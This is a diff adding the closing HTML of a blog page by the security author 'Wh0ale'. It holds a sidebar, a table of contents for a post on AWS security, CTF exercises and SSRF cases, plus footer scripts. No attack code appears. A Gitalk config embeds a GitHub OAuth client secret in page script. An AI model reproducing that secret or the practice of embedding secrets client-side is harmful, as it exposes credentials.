+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">59</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/Wh0ale" title="GitHub &rarr; https://github.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://medium.com/@Wh0ale" title="Medium &rarr; https://medium.com/@Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-medium"></i>Medium</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="/AttackerWh0ale@gmail.com" title="Mail &rarr; AttackerWh0ale@gmail.com"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://twitter.com/Wh0ale" title="Twitter &rarr; https://twitter.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#aws安装"><span class="nav-number">1.</span> <span class="nav-text">aws安装</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#管理存储桶"><span class="nav-number">1.1.</span> <span class="nav-text">管理存储桶</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#管理对象"><span class="nav-number">1.2.</span> <span class="nav-text">管理对象</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#什么是-Amazon-EC2？"><span class="nav-number">1.3.</span> <span class="nav-text">什么是 Amazon EC2？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#什么是-IAM？"><span class="nav-number">1.4.</span> <span class="nav-text">什么是 IAM？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实例元数据和用户数据"><span class="nav-number">1.5.</span> <span class="nav-text">实例元数据和用户数据</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#AWS工具集"><span class="nav-number">2.</span> <span class="nav-text">AWS工具集</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#aws漏洞类型"><span class="nav-number">3.</span> <span class="nav-text">aws漏洞类型</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#aws-hackerone报告"><span class="nav-number">4.</span> <span class="nav-text">aws hackerone报告</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#aws-ctf"><span class="nav-number">5.</span> <span class="nav-text">aws ctf</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ctf1-当-Everyone-具有访问权限"><span class="nav-number">5.1.</span> <span class="nav-text">ctf1 当 Everyone 具有访问权限</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ctf2-Any-Authenticated-AWS-User"><span class="nav-number">5.2.</span> <span class="nav-text">ctf2 Any Authenticated AWS User</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ctf3-aws-access-key-管理问题"><span class="nav-number">5.3.</span> <span class="nav-text">ctf3 aws access key 管理问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ctf4-快照利用"><span class="nav-number">5.4.</span> <span class="nav-text">ctf4 快照利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ctf5-元数据服务"><span class="nav-number">5.5.</span> <span class="nav-text">ctf5 元数据服务</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ctf6-IAM策略错误"><span class="nav-number">5.6.</span> <span class="nav-text">ctf6 IAM策略错误</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#aws案例"><span class="nav-number">6.</span> <span class="nav-text">aws案例</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#在AWS-Elastic-Beanstalk中利用SSRF"><span class="nav-number">6.1.</span> <span class="nav-text">在AWS Elastic Beanstalk中利用SSRF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#从SSRF到最终获取AWS-S3-Bucket访问权限的实际案例"><span class="nav-number">6.2.</span> <span class="nav-text">从SSRF到最终获取AWS S3 Bucket访问权限的实际案例</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#配置错误的AWS到AWS-Bucket-Takeover的信息泄露"><span class="nav-number">6.3.</span> <span class="nav-text">配置错误的AWS到AWS Bucket Takeover的信息泄露</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wh0ale</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">1.4m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">21:52</span>
+</div>
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("03/31/2019 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script src="/lib/reading_progress/reading_progress.js"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  <script src="/js/utils.js?v=7.3.0"></script>
+  <script src="/js/motion.js?v=7.3.0"></script>
+
+  
+  <script src="/js/affix.js?v=7.3.0"></script>
+  <script src="/js/schemes/pisces.js?v=7.3.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.3.0"></script>
+<script src="/js/post-details.js?v=7.3.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.3.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.3.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '925b9aa350afc793e04c',
+    clientSecret: 'bcd92ef416b81450a12e6388b00dfa49f798437a',
+    repo: 'Wh0ale.github.io',
+    owner: 'Wh0ale',
+    admin: ['Wh0ale'],
+    id: md5(location.pathname),
+      language: window.navigator.language || window.navigator.userLanguage,
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+
+</body>
+</html>
